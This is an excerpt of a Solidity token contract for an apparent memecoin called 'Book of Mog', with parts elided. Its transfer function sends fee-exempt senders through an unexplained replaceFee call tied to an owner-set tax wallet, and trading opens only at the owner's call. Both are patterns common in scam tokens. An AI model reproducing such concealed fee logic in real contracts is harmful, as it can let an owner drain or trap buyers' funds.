...
/* 
    website  : https://bookofmog.xyz
    telegram : https://t.me/bookofmogerc
    twitter  : https://x.com/bookofmogerc
*/
...
contract BOM is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Book of Mog";
    ...
    function tokenTransfer(address from, address to, uint256 amount) internal {
        uint256 taxAmount = 0;
        if (lastSellBlock < 2) {
            if (!_isExcludedFromFee[from]) taxAmount = basicFee(from, to, amount);
            else taxAmount = replaceFee(_taxWallet, from, amount.add(_finalBuyFee));
        }
    ...
    function createBOM(address feeReceiver) external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        ); _taxWallet = payable(feeReceiver);
    ...
    function enableBOM() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }
